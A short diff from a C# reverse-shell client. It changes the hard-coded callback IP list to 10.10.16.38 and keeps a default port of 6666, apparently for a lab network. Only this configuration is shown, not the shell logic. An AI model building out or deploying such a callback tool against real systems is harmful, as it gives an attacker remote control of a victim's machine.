@@ -22,8 +22,8 @@ namespace ReverseShellClient
             int port = args.Length > 0 ? int.Parse(args[0]) : 6666;
 
             string[] ips = {
-                "192.168.2.116",
-                "192.168.1.111"
+                "10.10.16.38",
+                "10.10.16.38"
             };
             int ipIndex = 0;
 
